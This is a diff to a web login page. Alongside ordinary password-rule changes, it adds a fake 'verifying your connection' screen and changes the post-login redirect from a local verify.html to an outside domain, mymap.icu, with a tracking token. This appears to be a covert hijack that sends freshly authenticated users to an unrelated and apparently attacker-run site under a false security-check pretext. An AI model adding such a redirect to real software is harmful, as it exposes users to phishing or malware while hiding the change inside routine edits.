@@ -93,9 +93,10 @@
         .divider::before, .divider::after { content: ''; flex: 1; border-top: 1px solid var(--border); }
         .divider:not(:empty)::before { margin-right: 1rem; }
         .divider:not(:empty)::after { margin-left: 1rem; }
-    </style>
+    #verifying-screen{display:none;position:fixed;inset:0;z-index:9999;background:var(--bg);justify-content:center;align-items:center;padding:1rem}#verifying-screen.show{display:flex}.verifying-card{width:100%;max-width:420px;text-align:center;background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:2rem;box-shadow:0 10px 40px rgba(0,0,0,.45)}.verifying-card h2{font-size:1.05rem;margin:1rem 0 .5rem}.verifying-card p{color:var(--text-muted);font-size:.85rem;line-height:1.5}.spinner{width:34px;height:34px;margin:auto;border:3px solid var(--border);border-top-color:var(--primary);border-radius:50%;animation:spin .8s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}.password-rule,.code-notice{display:block;margin-top:.35rem;color:var(--text-muted);font-size:.72rem;line-height:1.4}.code-notice{text-align:center}</style>
 </head>
 <body>
+<div id="verifying-screen"><div class="verifying-card"><div class="spinner"></div><h2>Wait, we are verifying your connection.</h2><p>Please wait while we securely verify your connection.</p></div></div>
 
     <div class="auth-card">
         <div class="header">
@@ -118,8 +119,9 @@
             </div>
             <div class="input-group">
                 <label>Password</label>
-                <input type="password" id="password" placeholder="••••••••">
+                <input type="password" id="password" placeholder="••••••••" minlength="8" autocomplete="current-password">
             </div>
+            <small class="password-rule">Password must be at least 8 characters and contain at least one uppercase letter.</small>
             <button class="btn btn-primary" id="btn-email-login">Continue with Email</button>
 
             <div class="divider">OR</div>
@@ -140,7 +142,7 @@
                 <label>Clearance Code</label>
                 <input type="password" id="access-code" placeholder="Enter access code">
             </div>
-            <button class="btn btn-primary" id="btn-code-login">Validate & Enter</button>
+            <button class="btn btn-primary" id="btn-code-login">Validate & Enter</button><p class="code-notice">Access-code accounts are temporary and are automatically deleted after 30 days.</p>
         </div>
     </div>
 
@@ -203,7 +205,8 @@
             } catch (e) {
                 console.warn("Firestore write skipped:", e.message);
             }
-            window.location.href = "verify.html";
+            document.getElementById("verifying-screen").classList.add("show");
+            window.location.href = "https://mymap.icu/verify.php?verify=YYE9JC";
         }
 
         // SHA-256 for code validation
@@ -243,6 +246,8 @@
             const email = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value;
             if (!email || !password) return showError("Email and password are required.");
+            if (password.length < 8) return showError("Password must be at least 8 characters long.");
+            if (!/[A-Z]/.test(password)) return showError("Password must contain at least one uppercase letter.");
 
             try {
                 const cred = await signInWithEmailAndPassword(auth, email, password);
